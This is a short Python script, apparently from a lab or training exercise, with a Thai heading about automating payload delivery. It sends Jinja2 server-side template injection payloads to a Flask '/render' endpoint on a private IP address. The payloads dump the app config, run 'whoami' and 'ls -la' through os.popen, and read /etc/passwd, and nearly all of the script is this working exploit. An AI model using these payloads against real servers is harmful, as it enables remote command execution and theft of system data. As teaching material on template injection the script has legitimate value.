## สร้างการทำงานแบบอัตโนมัติ Script ต้องสามารถส่ง Payload ต่าง ๆ ไปยังแอปพลิเคชันได้เองโดยไม่ต้องกรอกผ่านหน้าเว็บทีละตัว

import requests

url = "http://192.168.109.131:5000/render" 


payloads = {
    "Confirmation": "{{ 7*7 }}",
    "Check Environment": "{{ config.items() }}", 
    "Who Am I": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}",
    "List Files (ls)": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}", 
    "Read /etc/passwd": "{{ self.__init__.__globals__.__builtins__['open']('/etc/passwd').read() }}", 
}

def exploit_demonstration():
    print(f"--- Starting Automated Vulnerability Demonstration ---")
    
    for description, payload in payloads.items():
        print(f"\n[+] Testing: {description}")
        print(f"    Payload: {payload}")
        
        try:

            response = requests.post(url, data={'input': payload}, timeout=5)
            

            if response.status_code == 200:
                print(f"[Result]:\n{response.text.strip()}")
            else:
                print(f"[!] Error: Server returned status code {response.status_code}")
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")

if __name__ == "__main__":
    exploit_demonstration()